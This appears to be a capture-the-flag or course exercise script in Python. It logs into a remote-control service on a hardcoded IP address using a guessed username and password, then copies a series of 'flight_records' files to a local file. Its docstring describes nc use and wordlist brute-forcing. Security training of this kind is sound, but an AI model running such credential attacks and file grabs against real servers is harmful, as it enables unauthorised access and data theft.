"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
from socket import error as SocketError

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """

    username = "kruegster\n"   # Hint: use OSINT
    password = "pokemon\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    s.send(username)   # Send a newline \n at the end of your command
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    s.send(password)   # Send a newline \n at the end of your command
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    print(data)             # Prints data

    s.send('cd home\n')
    data = s.recv(1024)
    print(data)
    s.send('cd flight_records\n')
    data = s.recv(1024)
    print(data)

    f = open('stuff.txt', 'a+')

    for i in range(600, 1000):
        s.send('cat AAC27' + str(i) + '.txt\n')
        data = s.recv(1024)
        print(data)
        f.write(data)




if __name__ == '__main__':
    brute_force()